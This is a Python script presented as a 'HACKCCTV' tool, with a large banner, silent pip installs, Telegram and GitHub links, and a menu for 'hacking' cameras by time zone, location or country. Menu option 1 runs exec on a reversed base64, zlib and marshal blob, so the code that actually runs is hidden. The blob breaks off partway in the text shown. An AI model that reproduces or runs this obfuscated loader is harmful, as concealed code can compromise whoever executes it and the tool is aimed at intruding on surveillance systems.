# © 2023 mohammadmahditermux











































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































print ('\x1b[1;96m installing laibrary....')


import os 
from time import sleep as S
try:
    import requests, re , colorama
    colorama.init()
    # comment: 
except :
    os.system ('pip install requests')
    os.system ('pip install re')
    os.system ('pip install colorama')
try:
    import pyfiglet
except:
    os.system('pip install pyfiglet')

    
try:
    import termcolor
    
except:
    os.system('pip install termcolor')
#
# end try


os.system('cls'or'clear')
green  ="\x1b[1;92m"
cyan   ="\x1b[1;96m"
yellow ="\x1b[1;93m"
magenta   ="\x1b[1;95m"
white  ="\x1b[1;97m"
blue   ="\x1b[1;94m"
red  ='\x1b[1;91m'
underline = '\033[4m'
pink = '\033[35m'
bold = '\033[1m'
black='\033[30m'
# import timezone
# import location
# import country







print(f"""{white+bold}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢻⡟⠩⣿⣿⣿⣿⣿⡟⠀⢼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠡⣤⣀⠀⠻⣿⣿⣿⡟⢀⠀⡇⡆⠘⣿⣿⣿⣿⠀⣴⠘⣿⣿⣿⣿⡟⣻⣿⢻⣿⣿⣿⠟⡟⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠈⣿⣿⣿⣿⣷⡀⢿⣿⣷⢀⣿⣿⣿⡿⢸⣧⢸⣗⡀⢿⣿⣿⡏⣴⣶⣦⢻⣿⣿⡟⢀⣿⠃⣼⣿⣿⠏⢰⣷⡄⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⣌⠛⢿⣿⣿⣷⢸⣿⢇⣼⣿⣿⣿⣧⣿⣿⣿⣿⡇⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⡇⣴⣶⢰⣿⣿⡿⣠⣿⣿⠅⢀⣿⣿⣿⣿⣭⢉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠻⢿⣿⣿⣿⣿⡄⣫⣴⣮⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⣿⣿⣿⣿⣛⣩⣴⣿⣿⣿⣿⠟⢁⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠉⢣⠐⡀⠙⢿⣿⣿⣷⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣠⣿⣿⣿⣿⣿⣿⣏⡙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⡀⣦⡀⣿⣶⡈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣭⣬⣿⣿⣿⣿⣿⣿⠋⢀⣴⣶⣮⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠻⡿⣿⣿⣿⣿⣷⣸⣿⣾⣿⣿⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠻⢄⢠⡈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⢤⣁⢻⣷⣦⡹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠠⣶⣄⡙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⢿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢋⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⡐⢿⣿⣾⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣯⠈⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢼⠎⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⢼⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⡿⠿⠛⠻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠣⡄⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣼⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢣⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⣃⠀⠿⠇⢸⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣦⠐⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⡿⣧⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢃⣾⢿⢲⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⡟⢁⣼⣷⣾⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⢿⣶⣷⣮⠻⣿⣿⣿⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠉⠉⠛⠿⢿⣿⣿⡿⢫⣴⣵⣷⡕⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⢷⣦⡌⣙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⢻⡽⣿⣿⢤⠉⠁⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠈⠫⢾⣿⣿⢯⢋⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠋⠉⠙⠛⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣦⡈⠉⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢾⣽⣿⠗⠁⠀⠀⠀⠀⠀⠀⠀⣰⣿⣄⠀⠀⠀⠀⠀⠀⠀⠐⢿⣿⣯⡇⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠒⠛⠻⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠊⠂⠁⠀⠀⠀⠀⢀⣀⣤⣴⣿⣿⣿⣿⣷⣦⣤⣠⠀⠀⠀⠀⠀⠀⠈⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⢁⣤⣿⣿⣿⣿
⣿⣿⣿⢋⠉⠉⢉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⢀⣾⣿⡿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣧⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣭⣴⣶⣾⣿⣿⣿⣿⣿⣿
⣿⣿⣮⡛⠿⠿⠿⢷⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣇⢿⣿⣿⣿⣿⣿⠜⣺⣿⣿⣷⣤⣀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠻⢿⣿
⣿⣿⣿⣿⣶⣦⣴⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣶⡙⣿⣿⡿⢡⣾⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⣀⣴⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠇⠀⠀⠀⠀⣼⡏⣿⣿⣿⣿⣿⣿⠇⣿⣿⡇⢾⣿⣿⣿⣿⣿⣿⢿⡇⠀⠀⠀⠀⡟⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⣉⠉⣉⣉⣽⣿
⣿⡉⠠⢤⣀⣀⣄⣭⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣰⠸⣮⡀⠀⢀⡴⣫⣾⣿⣿⣿⣿⣿⣿⡏⣿⣿⣿⢾⣿⣿⣿⣿⣿⣿⣶⡙⣆⡀⠀⢀⣾⢣⡎⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⠉⠁⣁⣈⣙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⡶⣜⢿⡞⣿⣧⠻⣿⣿⣿⣿⣿⡿⢟⢵⣿⣿⣿⡞⡻⣿⣿⣿⣿⣿⣿⢏⣿⣿⣱⡟⣵⢸⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⡿⠟⠛
⣿⣷⣦⣤⣍⣛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢿⣷⢝⢾⣷⡏⠟⣵⢦⣭⣭⠉⢷⣮⣹⡘⠿⣿⠟⣡⢿⣷⠎⠉⣭⣽⣰⣎⠟⣷⣿⡟⢡⣿⡟⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⡌⠁⠀⠐⢾
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣎⢿⣇⠇⣿⣿⣆⠋⢾⣿⡀⠀⢠⡿⠃⣬⢻⣿⢟⣅⠏⣿⡀⠀⣠⣿⡇⢟⣼⣿⣳⠕⣼⡟⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣫⣴⣿⣿⣶⣦
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⠇⣿⣾⣿⣿⣮⣽⣛⣻⣛⣁⣺⢿⣿⣿⣼⢿⣂⣈⣛⣛⣛⣭⣶⣿⣻⣷⣧⢻⣿⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡸⢿⡄⢻⣟⣿⣿⣿⣿⡿⣿⣿⠿⢿⣷⢹⣿⣏⣾⡿⠿⣿⣿⣿⣿⣿⣻⣿⢿⡏⣸⡿⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣼⣦⣍⠻⣿⣿⣻⣧⢿⠁⣾⣶⣿⣼⣿⣧⣷⣶⡗⢸⣟⣿⣧⣿⡿⢟⣩⣾⣧⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣸⣿⡇⣿⢛⠀⠬⣳⠟⣟⣴⣌⣛⠿⣿⣿⣿⢟⣛⣥⣏⡺⢻⣛⠕⠠⡹⣷⢿⣿⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢿⠇⣇⢏⣇⡃⡌⡻⠿⠿⢿⣻⣟⣪⢭⣕⣿⡛⡿⠿⠿⣋⢱⢘⡴⡇⡟⠸⡟⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣝⠸⣮⠸⣟⡆⣿⡏⣿⡟⣴⡖⣭⢭⣅⢶⣎⢿⣿⢻⡿⣰⡿⢗⣼⢡⣫⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡕⡱⣜⠵⡹⢡⣶⣾⣶⣷⠮⠶⠷⣶⣶⣶⣶⡜⠇⡷⣣⢋⣳⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⢜⣃⠰⢿⣿⣿⢟⣥⣿⣿⣷⣌⠻⣿⣿⠿⠦⡼⡑⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣎⠜⣇⡕⣮⡱⢟⡛⣿⣙⣟⢛⡻⢂⣴⠣⡼⡱⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡞⣾⢰⠸⢟⣨⡷⢶⢶⡶⢯⣅⡿⠇⡏⡷⣱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣞⢙⠾⠿⣋⡼⢟⣾⠻⢶⣝⠿⠷⡪⣱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡻⠟⢋⣴⣿⣿⣿⣦⡙⠻⣏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣭⣽⠛⠒⠛⣯⣽⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
"""      )              


for x in range(3):
    for i in ("⢿", "⣻", "⣽", "⣾", "⣷", "⣯", "⣟", "⡿"):
        S(0.1)
        if x == 0:
            print('',end='')
            break
        else:
            print(yellow+' ~>>Loading '+i,end='\r')    
os.system("cls"or"clear")
os.system("cls"or"clear")

while True:
    
    try:
        os.system("cls"or"clear")




        num=input(f"""{cyan}██╗  ██╗ █████╗  ██████╗██╗  ██╗ ██████╗ ██████╗████████╗██╗   ██╗
██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔════╝╚══██╔══╝██║   ██║
███████║███████║██║     █████╔╝ ██║     ██║        ██║   ██║   ██║
██╔══██║██╔══██║██║     ██╔═██╗ ██║     ██║        ██║   ╚██╗ ██╔╝
██║  ██║██║  ██║╚██████╗██║  ██╗╚██████╗╚██████╗   ██║    ╚████╔╝ 
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝   ╚═╝     ╚═══╝  
                     

{red}𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺

{green}[<ID~>github] ▪︎  {white}https://github.com/namastehacing/HACKCCTV_KH
{cyan}[<ID~>telegram] ▪︎  {white}@NAMASTEHACKINGKH
{magenta}[<ID~>Telegram] ▪︎  {white}https://t.me/ShareToolBuffViewTikTok\~/@NAMASTEHACKINGKH


{red}𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺
    {yellow}╓                      {yellow}╖
    {yellow}╟1-{red}Hacking by {green}time zone{yellow}║
    {yellow}║                      {yellow}║
    {yellow}╟2-{red}Hacking by {green}location {yellow}║
    {yellow}║                      {yellow}║
    {yellow}╟3-{red}Hacking by {green}counties {yellow}║
    {yellow}║                      {yellow}║
    {yellow}╙                      {yellow}╜
    {green}$/> {blue}Enter a number :{pink}""")


        if num =='1':
            # Decypt lambda by mamadcoder
            _ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'=M6Gin8C+Hy/fc//L53v3yvvOqSYXy//7v/fu/V6+/P93zv//9W9f+s//s+//ZeXl/x//9W+/TTtuhifyZLnu7XdBPQzkWR9QY6wDE7/mRBn8nqtX/1K7SykPuUmV2bHKqyq2i7PmHyD8NiryHVIZjBV/mKFDGEYAaOYBaISCWgPmXBWuUwLiCANngEIUxPcp8jCfQKBBZiiBfkCINQqS/hDrLJPRXYzlXnhM00h6v7IkPkP6JMxco+xMM/MdcDNc8Cbs6NY86dC4UMFSEzUtEwVm3R8a/Rl8XNehvIM2+cs6ypBt8lXQhIWsaIP9LU94xwhqcHStor69kn6bg2HQ6rVFHtVEGb8Pg+kOvdzo56Ad8Rki0UppqRJrXGobfzGA3Oc46N7c/6uFZ/C3tg90MXC2brrSMXZDq8bZqeg9rQnCniRjgjG1cok3idYJTSEJw0rQFVuFM88ef8eKnSiyMLrmSfUF9/kDrUsu0p3IZLS4V8SwEkUgCKNoRxOQGCgLwy1b8LujmAwR8AH2M8UEmIRaVKheRN3jZX34lo34w2uG1J5pxSqlauUPIzdX7rm19riJMRLT/kYiKSuCjzVbDOOu8EWyO10VOqnT+rALn/Uw/bzQ+CO8Oi7srcM0fpPd4xuMH8JfaWclYCHgQgy/5ah6CE7ijhUjIxHnM27JX7m08j2ufWwUrpGfw3I/AD